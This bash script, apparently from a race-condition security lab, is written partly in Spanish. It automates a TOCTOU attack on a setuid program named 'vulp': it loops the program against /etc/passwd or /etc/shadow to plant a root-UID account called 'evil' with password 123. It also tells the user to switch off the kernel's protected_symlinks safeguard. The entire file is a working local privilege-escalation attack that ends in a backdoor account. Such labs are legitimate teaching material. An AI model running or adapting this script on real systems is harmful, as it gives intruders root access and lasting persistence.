#!/bin/bash

PASSWD_FILE="/etc/passwd"
SHADOW_FILE="/etc/shadow"

echo "=== Race Condition Attack (Parametrizable) ==="
echo

if [ "$EUID" -eq 0 ]; then
    echo "ERROR: Don't run as root!"
    exit 1
fi

if [ ! -u "vulp" ]; then
    echo "ERROR: vulp needs setuid bit"
    echo "Run: sudo chown root:root vulp && sudo chmod u+s vulp"
    exit 1
fi

if [ "$SYMLINK_PROTECTION" = "1" ]; then
    echo "WARNING: protected_symlinks is enabled"
    echo "Consider running: sudo sysctl -w fs.protected_symlinks=0"
    echo "Continue anyway? (y/n)"
    read -n 1 answer
    echo
    if [ "$answer" != "y" ]; then
        exit 1
    fi
fi

# Función para ejecutar vulp con un archivo de entrada
run_vulp() {
    local input_file=$1
    local count=0
    while [ $count -lt 10000 ]; do
        ./vulp < "$input_file" >/dev/null 2>&1
        sleep 0.01
        count=$((count + 1))
    done
}

# Función para monitorear un archivo hasta que cambie su mtime
wait_for_change() {
    local file=$1
    local old_mtime=$(stat -c %Y "$file")
    echo "[+] Monitoring $file for changes..."
    while [ "$old_mtime" = "$(stat -c %Y $file)" ]; do
        sleep 1
    done
    echo "[SUCCESS] $file fue modificado."
}

# Verifica argumentos
if [ "$1" = "-p" ]; then
    echo "[+] Ejecutando ataque a $PASSWD_FILE..."
    ./attack "$PASSWD_FILE" &
    ATTACK_PID=$!
    run_vulp evil_input.txt &
    VULP_PID=$!
    sleep 10
    if tail -5 "$PASSWD_FILE" | grep -q "evil:x:0:0"; then
        echo "[SUCCESS] Entrada maliciosa encontrada en $PASSWD_FILE"
    else
        echo "[!] Entrada aún no encontrada. Puedes intentar nuevamente."
    fi
    kill $ATTACK_PID $VULP_PID 2>/dev/null

elif [ "$1" = "-s" ]; then
    echo "[+] Ejecutando ataque a $SHADOW_FILE..."
    ./attack "$SHADOW_FILE" &
    ATTACK_PID=$!
    run_vulp evil_input_shadow.txt &
    VULP_PID=$!
    wait_for_change "$SHADOW_FILE"
    kill $ATTACK_PID $VULP_PID 2>/dev/null
    echo "Puedes intentar: su evil (contraseña: 123)"

else
    echo "Uso: $0 -p  # Ataque a $PASSWD_FILE"
    echo "       $0 -s  # Ataque a $SHADOW_FILE"
    exit 1
fi
